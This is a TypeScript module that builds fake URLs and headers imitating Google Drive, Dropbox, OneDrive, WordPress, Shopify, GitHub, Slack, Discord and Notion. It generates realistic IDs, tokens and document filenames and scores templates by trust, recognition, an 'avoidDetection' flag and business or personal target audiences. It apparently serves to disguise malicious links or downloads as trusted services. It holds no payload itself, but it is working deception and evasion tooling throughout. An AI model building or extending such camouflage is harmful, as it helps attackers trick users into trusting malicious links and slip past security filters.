/**
 * Behavioral Mimicry Patterns
 * Mimics popular services like Google Drive, Dropbox, OneDrive, WordPress, Shopify, etc.
 */

export interface ServiceMimicryPattern {
  id: string;
  serviceName: string;
  template: string;
  category: 'cloud_storage' | 'cms' | 'ecommerce' | 'social' | 'productivity' | 'development';
  trustScore: number;
  recognitionRate: number; // How well it mimics the real service
  description: string;
  placeholders: string[];
  headers: Record<string, string>;
  queryParams: Record<string, string>;
}

export interface MimicryOptions {
  preferHighTrust?: boolean;
  avoidDetection?: boolean;
  matchContentType?: string;
  targetAudience?: 'business' | 'personal' | 'mixed';
}

export class BehavioralMimicryService {
  
  private mimicryPatterns: ServiceMimicryPattern[] = [
    // Google Drive patterns
    {
      id: 'google_drive_file',
      serviceName: 'Google Drive',
      template: '/file/d/{fileid}/view?usp=sharing&resourcekey={resourcekey}&export=download&confirm={confirm}',
      category: 'cloud_storage',
      trustScore: 98,
      recognitionRate: 95,
      description: 'Google Drive file sharing link',
      placeholders: ['fileid', 'resourcekey', 'confirm'],
      headers: {
        'Content-Type': 'application/pdf',
        'Content-Disposition': 'attachment'
      },
      queryParams: {
        'usp': 'sharing',
        'export': 'download'
      }
    },
    {
      id: 'google_drive_folder',
      serviceName: 'Google Drive',
      template: '/drive/folders/{folderid}?usp=sharing&resourcekey={resourcekey}&hl=en',
      category: 'cloud_storage',
      trustScore: 96,
      recognitionRate: 93,
      description: 'Google Drive folder sharing',
      placeholders: ['folderid', 'resourcekey'],
      headers: {
        'Content-Type': 'text/html'
      },
      queryParams: {
        'usp': 'sharing',
        'hl': 'en'
      }
    },
    
    // Dropbox patterns
    {
      id: 'dropbox_file',
      serviceName: 'Dropbox',
      template: '/s/{shareid}/{filename}?dl=1&token_hash={tokenhash}&expires={expires}',
      category: 'cloud_storage',
      trustScore: 95,
      recognitionRate: 92,
      description: 'Dropbox file sharing link',
      placeholders: ['shareid', 'filename', 'tokenhash', 'expires'],
      headers: {
        'Content-Type': 'application/octet-stream',
        'Content-Disposition': 'attachment; filename="{filename}"'
      },
      queryParams: {
        'dl': '1'
      }
    },
    {
      id: 'dropbox_folder',
      serviceName: 'Dropbox',
      template: '/sh/{folderid}/{foldername}?dl=0&preview={filename}&subfolder_nav_tracking=1',
      category: 'cloud_storage',
      trustScore: 93,
      recognitionRate: 90,
      description: 'Dropbox folder preview',
      placeholders: ['folderid', 'foldername', 'filename'],
      headers: {
        'Content-Type': 'text/html'
      },
      queryParams: {
        'dl': '0',
        'subfolder_nav_tracking': '1'
      }
    },
    
    // OneDrive patterns
    {
      id: 'onedrive_personal',
      serviceName: 'OneDrive',
      template: '/personal/{username}_domain_com/Documents/{path}/{filename}?d={shareid}&csf=1&web=1&e={expires}',
      category: 'cloud_storage',
      trustScore: 94,
      recognitionRate: 91,
      description: 'OneDrive personal file sharing',
      placeholders: ['username', 'path', 'filename', 'shareid', 'expires'],
      headers: {
        'Content-Type': 'application/pdf'
      },
      queryParams: {
        'csf': '1',
        'web': '1'
      }
    },
    {
      id: 'onedrive_business',
      serviceName: 'OneDrive for Business',
      template: '/sites/{sitename}/Shared%20Documents/{folder}/{filename}?d={shareid}&csf=1&web=1&at=9',
      category: 'cloud_storage',
      trustScore: 96,
      recognitionRate: 94,
      description: 'OneDrive for Business sharing',
      placeholders: ['sitename', 'folder', 'filename', 'shareid'],
      headers: {
        'Content-Type': 'application/pdf'
      },
      queryParams: {
        'csf': '1',
        'web': '1',
        'at': '9'
      }
    },
    
    // WordPress patterns
    {
      id: 'wordpress_media',
      serviceName: 'WordPress',
      template: '/wp-content/uploads/{year}/{month}/{filename}.{extension}?ver={version}&download=1',
      category: 'cms',
      trustScore: 88,
      recognitionRate: 85,
      description: 'WordPress media file',
      placeholders: ['year', 'month', 'filename', 'extension', 'version'],
      headers: {
        'Content-Type': 'application/pdf'
      },
      queryParams: {
        'download': '1'
      }
    },
    {
      id: 'wordpress_plugin',
      serviceName: 'WordPress',
      template: '/wp-content/plugins/{pluginname}/assets/{filename}.{extension}?ver={version}&cache={cache}',
      category: 'cms',
      trustScore: 85,
      recognitionRate: 82,
      description: 'WordPress plugin asset',
      placeholders: ['pluginname', 'filename', 'extension', 'version', 'cache'],
      headers: {
        'Content-Type': 'application/javascript'
      },
      queryParams: {}
    },
    
    // Shopify patterns
    {
      id: 'shopify_product',
      serviceName: 'Shopify',
      template: '/products/{producthandle}?variant={variantid}&utm_source={source}&utm_medium={medium}',
      category: 'ecommerce',
      trustScore: 87,
      recognitionRate: 84,
      description: 'Shopify product page',
      placeholders: ['producthandle', 'variantid', 'source', 'medium'],
      headers: {
        'Content-Type': 'text/html'
      },
      queryParams: {}
    },
    {
      id: 'shopify_checkout',
      serviceName: 'Shopify',
      template: '/cart/{carttoken}?discount={discountcode}&ref={referrer}&step=contact_information',
      category: 'ecommerce',
      trustScore: 89,
      recognitionRate: 86,
      description: 'Shopify checkout process',
      placeholders: ['carttoken', 'discountcode', 'referrer'],
      headers: {
        'Content-Type': 'text/html'
      },
      queryParams: {
        'step': 'contact_information'
      }
    },
    
    // Squarespace patterns
    {
      id: 'squarespace_file',
      serviceName: 'Squarespace',
      template: '/s/{fileid}/download?format=original&download=1&token={token}',
      category: 'cms',
      trustScore: 84,
      recognitionRate: 81,
      description: 'Squarespace file download',
      placeholders: ['fileid', 'token'],
      headers: {
        'Content-Type': 'application/pdf'
      },
      queryParams: {
        'format': 'original',
        'download': '1'
      }
    },
    
    // Wix patterns
    {
      id: 'wix_media',
      serviceName: 'Wix',
      template: '/media/{mediaid}/{filename}.{extension}?dn={displayname}&token={token}',
      category: 'cms',
      trustScore: 82,
      recognitionRate: 79,
      description: 'Wix media file',
      placeholders: ['mediaid', 'filename', 'extension', 'displayname', 'token'],
      headers: {
        'Content-Type': 'application/pdf'
      },
      queryParams: {}
    },
    
    // GitHub patterns
    {
      id: 'github_release',
      serviceName: 'GitHub',
      template: '/{username}/{repository}/releases/download/{tag}/{filename}.{extension}',
      category: 'development',
      trustScore: 90,
      recognitionRate: 88,
      description: 'GitHub release download',
      placeholders: ['username', 'repository', 'tag', 'filename', 'extension'],
      headers: {
        'Content-Type': 'application/zip'
      },
      queryParams: {}
    },
    {
      id: 'github_raw',
      serviceName: 'GitHub',
      template: '/{username}/{repository}/raw/{branch}/{path}/{filename}.{extension}',
      category: 'development',
      trustScore: 88,
      recognitionRate: 85,
      description: 'GitHub raw file access',
      placeholders: ['username', 'repository', 'branch', 'path', 'filename', 'extension'],
      headers: {
        'Content-Type': 'text/plain'
      },
      queryParams: {}
    },
    
    // Slack patterns
    {
      id: 'slack_file',
      serviceName: 'Slack',
      template: '/files/{teamid}/{fileid}/{filename}?t={timestamp}&download=true&origin_team={teamid}',
      category: 'productivity',
      trustScore: 91,
      recognitionRate: 87,
      description: 'Slack file sharing',
      placeholders: ['teamid', 'fileid', 'filename', 'timestamp'],
      headers: {
        'Content-Type': 'application/pdf'
      },
      queryParams: {
        'download': 'true'
      }
    },
    
    // Discord patterns
    {
      id: 'discord_attachment',
      serviceName: 'Discord',
      template: '/attachments/{channelid}/{messageid}/{filename}?ex={expires}&is={issued}&hm={hash}',
      category: 'social',
      trustScore: 86,
      recognitionRate: 83,
      description: 'Discord file attachment',
      placeholders: ['channelid', 'messageid', 'filename', 'expires', 'issued', 'hash'],
      headers: {
        'Content-Type': 'application/pdf'
      },
      queryParams: {}
    },
    
    // Notion patterns
    {
      id: 'notion_file',
      serviceName: 'Notion',
      template: '/file/{fileid}/{filename}?id={pageid}&table=block&spaceId={spaceid}&userId={userid}',
      category: 'productivity',
      trustScore: 89,
      recognitionRate: 86,
      description: 'Notion file attachment',
      placeholders: ['fileid', 'filename', 'pageid', 'spaceid', 'userid'],
      headers: {
        'Content-Type': 'application/pdf'
      },
      queryParams: {
        'table': 'block'
      }
    }
  ];

  /**
   * Select mimicry pattern by service name
   */
  selectByService(serviceName: string): ServiceMimicryPattern | undefined {
    return this.mimicryPatterns.find(p => 
      p.serviceName.toLowerCase().includes(serviceName.toLowerCase())
    );
  }

  /**
   * Select optimal mimicry pattern based on options
   */
  selectOptimalPattern(options: MimicryOptions = {}): ServiceMimicryPattern {
    const {
      preferHighTrust = true,
      avoidDetection = true,
      targetAudience = 'mixed'
    } = options;

    let candidates = [...this.mimicryPatterns];

    // Filter by target audience
    if (targetAudience === 'business') {
      candidates = candidates.filter(p => 
        ['cloud_storage', 'productivity', 'development'].includes(p.category)
      );
    } else if (targetAudience === 'personal') {
      candidates = candidates.filter(p => 
        ['cloud_storage', 'social', 'cms', 'ecommerce'].includes(p.category)
      );
    }

    // Score candidates
    const scoredCandidates = candidates.map(pattern => {
      let score = 0;

      // Trust score weight (40%)
      if (preferHighTrust) {
        score += pattern.trustScore * 0.4;
      }

      // Recognition rate weight (30%) - higher is better for mimicry
      score += pattern.recognitionRate * 0.3;

      // Category bonus (20%)
      if (targetAudience === 'business' && ['cloud_storage', 'productivity'].includes(pattern.category)) {
        score += 20;
      } else if (targetAudience === 'personal' && ['social', 'ecommerce'].includes(pattern.category)) {
        score += 20;
      }

      // Avoid detection bonus (10%)
      if (avoidDetection && pattern.recognitionRate > 85) {
        score += 10;
      }

      return { pattern, score };
    });

    // Sort by score and add randomness
    scoredCandidates.sort((a, b) => b.score - a.score);
    const topCandidates = scoredCandidates.slice(0, Math.min(3, scoredCandidates.length));
    const selected = topCandidates[Math.floor(Math.random() * topCandidates.length)];

    return selected.pattern;
  }

  /**
   * Generate service-specific parameters
   */
  generateServiceParameters(pattern: ServiceMimicryPattern): Record<string, string> {
    const params: Record<string, string> = {};
    
    pattern.placeholders.forEach(placeholder => {
      params[placeholder] = this.generateServiceValue(placeholder, pattern);
    });

    return params;
  }

  private generateServiceValue(key: string, pattern: ServiceMimicryPattern): string {
    const now = new Date();
    
    switch (key) {
      // Google Drive specific
      case 'fileid':
        return this.generateGoogleFileId();
      case 'folderid':
        return this.generateGoogleFolderId();
      case 'resourcekey':
        return this.generateResourceKey();
      case 'confirm':
        return 't';
        
      // Dropbox specific
      case 'shareid':
        return this.generateDropboxShareId();
      case 'tokenhash':
        return this.generateTokenHash();
        
      // OneDrive specific
      case 'username':
        return this.generateUsername();
      case 'sitename':
        return this.generateSiteName();
      case 'path':
        return this.generatePath();
        
      // WordPress specific
      case 'pluginname':
        return this.generatePluginName();
      case 'version':
        return this.generateVersion();
      case 'cache':
        return Date.now().toString();
        
      // Shopify specific
      case 'producthandle':
        return this.generateProductHandle();
      case 'variantid':
        return this.generateVariantId();
      case 'carttoken':
        return this.generateCartToken();
      case 'discountcode':
        return this.generateDiscountCode();
        
      // GitHub specific
      case 'repository':
        return this.generateRepository();
      case 'tag':
        return this.generateTag();
      case 'branch':
        return this.generateBranch();
        
      // Slack specific
      case 'teamid':
        return this.generateTeamId();
      case 'timestamp':
        return Math.floor(Date.now() / 1000).toString();
        
      // Discord specific
      case 'channelid':
        return this.generateDiscordId();
      case 'messageid':
        return this.generateDiscordId();
      case 'expires':
        return Math.floor((Date.now() + 86400000) / 1000).toString(); // 24 hours
      case 'issued':
        return Math.floor(Date.now() / 1000).toString();
      case 'hash':
        return this.generateHash();
        
      // Notion specific
      case 'pageid':
        return this.generateNotionId();
      case 'spaceid':
        return this.generateNotionId();
      case 'userid':
        return this.generateNotionId();
        
      // Common parameters
      case 'filename':
        return this.generateFilename();
      case 'extension':
        return this.generateExtension();
      case 'year':
        return now.getFullYear().toString();
      case 'month':
        return (now.getMonth() + 1).toString().padStart(2, '0');
      case 'source':
        return this.generateSource();
      case 'medium':
        return this.generateMedium();
      case 'referrer':
        return this.generateReferrer();
      case 'displayname':
        return this.generateDisplayName();
      case 'token':
        return this.generateToken();
      case 'encrypted':
        return 'ENCRYPTED_DATA_PLACEHOLDER';
        
      default:
        return this.generateGenericValue(key);
    }
  }

  // Service-specific generators
  private generateGoogleFileId(): string {
    return `1${this.generateRandomString(32, 'ALPHANUMERIC')}`;
  }

  private generateGoogleFolderId(): string {
    return `1${this.generateRandomString(32, 'ALPHANUMERIC')}`;
  }

  private generateResourceKey(): string {
    return `0-${this.generateRandomString(39, 'ALPHANUMERIC')}`;
  }

  private generateDropboxShareId(): string {
    return this.generateRandomString(15, 'ALPHANUMERIC');
  }

  private generateTokenHash(): string {
    return this.generateRandomString(43, 'ALPHANUMERIC');
  }

  private generateUsername(): string {
    const names = ['john.smith', 'jane.doe', 'mike.johnson', 'sarah.wilson', 'david.brown'];
    return names[Math.floor(Math.random() * names.length)];
  }

  private generateSiteName(): string {
    const sites = ['corporate', 'finance', 'hr', 'marketing', 'sales', 'it'];
    return sites[Math.floor(Math.random() * sites.length)];
  }

  private generatePath(): string {
    const paths = ['Documents', 'Reports', 'Presentations', 'Shared'];
    return paths[Math.floor(Math.random() * paths.length)];
  }

  private generatePluginName(): string {
    const plugins = ['contact-form-7', 'yoast-seo', 'elementor', 'woocommerce', 'jetpack'];
    return plugins[Math.floor(Math.random() * plugins.length)];
  }

  private generateVersion(): string {
    return `${Math.floor(Math.random() * 5) + 1}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 20)}`;
  }

  private generateProductHandle(): string {
    const products = ['premium-package', 'special-offer', 'limited-edition', 'bestseller'];
    return products[Math.floor(Math.random() * products.length)];
  }

  private generateVariantId(): string {
    return (Math.floor(Math.random() * 900000) + 100000).toString();
  }

  private generateCartToken(): string {
    return this.generateRandomString(32, 'ALPHANUMERIC');
  }

  private generateDiscountCode(): string {
    const codes = ['SAVE20', 'WELCOME10', 'SPECIAL25', 'NEWUSER15'];
    return codes[Math.floor(Math.random() * codes.length)];
  }

  private generateRepository(): string {
    const repos = ['awesome-project', 'web-app', 'mobile-app', 'data-analysis', 'machine-learning'];
    return repos[Math.floor(Math.random() * repos.length)];
  }

  private generateTag(): string {
    return `v${this.generateVersion()}`;
  }

  private generateBranch(): string {
    const branches = ['main', 'master', 'develop', 'feature/new-feature', 'release/v1.0'];
    return branches[Math.floor(Math.random() * branches.length)];
  }

  private generateTeamId(): string {
    return `T${this.generateRandomString(10, 'ALPHANUMERIC').toUpperCase()}`;
  }

  private generateDiscordId(): string {
    return (Math.floor(Math.random() * 9000000000000000000) + 1000000000000000000).toString();
  }

  private generateHash(): string {
    return this.generateRandomString(64, 'ALPHANUMERIC');
  }

  private generateNotionId(): string {
    return `${this.generateRandomString(8, 'ALPHANUMERIC')}-${this.generateRandomString(4, 'ALPHANUMERIC')}-${this.generateRandomString(4, 'ALPHANUMERIC')}-${this.generateRandomString(4, 'ALPHANUMERIC')}-${this.generateRandomString(12, 'ALPHANUMERIC')}`;
  }

  private generateFilename(): string {
    const names = ['document', 'report', 'presentation', 'spreadsheet', 'image', 'file'];
    const name = names[Math.floor(Math.random() * names.length)];
    return `${name}_${Date.now().toString().slice(-6)}`;
  }

  private generateExtension(): string {
    const extensions = ['pdf', 'docx', 'xlsx', 'pptx', 'jpg', 'png', 'zip'];
    return extensions[Math.floor(Math.random() * extensions.length)];
  }

  private generateSource(): string {
    const sources = ['email', 'social', 'direct', 'search', 'referral'];
    return sources[Math.floor(Math.random() * sources.length)];
  }

  private generateMedium(): string {
    const mediums = ['email', 'cpc', 'organic', 'social', 'referral'];
    return mediums[Math.floor(Math.random() * mediums.length)];
  }

  private generateReferrer(): string {
    const referrers = ['google', 'facebook', 'twitter', 'linkedin', 'direct'];
    return referrers[Math.floor(Math.random() * referrers.length)];
  }

  private generateDisplayName(): string {
    return this.generateFilename();
  }

  private generateToken(): string {
    return this.generateRandomString(32, 'ALPHANUMERIC');
  }

  private generateGenericValue(key: string): string {
    return `${key}_${this.generateRandomString(8, 'ALPHANUMERIC')}`;
  }

  private generateRandomString(length: number, charset: 'ALPHANUMERIC' | 'ALPHA' | 'NUMERIC' = 'ALPHANUMERIC'): string {
    const alphanumeric = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const numeric = '0123456789';
    
    const chars = charset === 'ALPHA' ? alpha : charset === 'NUMERIC' ? numeric : alphanumeric;
    let result = '';
    
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    
    return result;
  }

  /**
   * Get all mimicry patterns
   */
  getAllPatterns(): ServiceMimicryPattern[] {
    return [...this.mimicryPatterns];
  }

  /**
   * Get patterns by category
   */
  getPatternsByCategory(category: 'cloud_storage' | 'cms' | 'ecommerce' | 'social' | 'productivity' | 'development'): ServiceMimicryPattern[] {
    return this.mimicryPatterns.filter(p => p.category === category);
  }

  /**
   * Get high-trust patterns
   */
  getHighTrustPatterns(): ServiceMimicryPattern[] {
    return this.mimicryPatterns
      .filter(p => p.trustScore >= 90)
      .sort((a, b) => b.trustScore - a.trustScore);
  }

  /**
   * Get patterns with high recognition rate
   */
  getHighRecognitionPatterns(): ServiceMimicryPattern[] {
    return this.mimicryPatterns
      .filter(p => p.recognitionRate >= 85)
      .sort((a, b) => b.recognitionRate - a.recognitionRate);
  }
}

export const behavioralMimicry = new BehavioralMimicryService();
